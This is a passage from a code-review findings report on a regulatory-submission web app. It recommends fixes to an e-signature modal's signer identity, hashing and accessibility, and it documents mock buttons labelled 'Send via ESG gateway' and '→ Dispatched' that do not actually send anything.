**Fix.** Have `/api/esignature/sign` return the signer identity it actually recorded and render that, with no client fallback — if the server did not return a name, show 'signer name unavailable — contact your administrator' rather than a placeholder. Add the document title, version, and content hash to the pre-sign body. Move focus to 'Done' on success and keep the Escape handler mounted. Then adopt this modal on the surfaces that currently roll their own: it is the correct implementation and, per grep, it currently has no production caller while `GatewayTransmittals` collects a §11 re-auth password through `C2CForm`, which has no label/input association, no `aria-modal`, no focus trap, and no in-flight disable.

#### `P2` F-17 — Primary buttons labelled "Send via ESG gateway" and "→ Dispatched" do not send or dispatch, and give no feedback that anything happened

`client/src/concept2cure/v2/surfaces/SubmissionCenter.tsx:554` · blocks **G1** · ~days

**Evidence.** `:554-566` renders a `sp-primary` button with a rocket icon reading 'Send via ESG gateway' whose entire handler is `onAsk('Freeze and dispatch … (governed — e-signature required).')` — it populates the AnA composer. `:388-401` renders a transition button per allowed target state, labelled with the target status ('→ Frozen', '→ Dispatched'), also `onAsk` only. The file's own comments at `:382-387` and `:541-544` flag both as MOCK-ACTION. Neither produces a toast, a pending state, or any change to the row; the sequence chip at `:380` still shows the old status after the click.
